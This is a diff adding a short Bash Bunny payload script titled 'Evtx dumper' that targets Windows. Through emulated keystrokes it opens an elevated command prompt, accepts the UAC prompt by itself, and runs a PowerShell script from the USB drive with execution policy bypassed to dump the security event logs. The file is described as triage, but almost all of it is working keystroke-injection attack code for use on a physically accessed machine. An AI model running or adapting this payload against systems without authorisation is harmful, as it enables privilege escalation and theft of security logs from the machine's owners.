@@ -1,0 +1,40 @@
+#!/bin/bash
+#
+# Title:            Evtx dumper
+# Payload creator:  Kevin
+# Target:           Windows
+
+# 
+# Executes triage.ps1 which executes scripts to dump window event logs (security)
+
+
+LED R B
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+LED R G
+
+QUACK GUI r
+QUACK DELAY 300
+QUACK STRING powershell Start-Process cmd -Verb runAs
+QUACK ENTER
+QUACK DELAY 2000
+QUACK ALT y
+QUACK DELAY 1000
+QUACK ALT j
+QUACK ENTER
+QUACK DELAY 1000
+
+LED R G
+
+QUACK STRING powershell -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch1\triage.ps1')"
+QUACK ENTER
+QUACK DELAY 20000
+QUACK STRING exit
+QUACK ENTER
+
+LED G
+
+
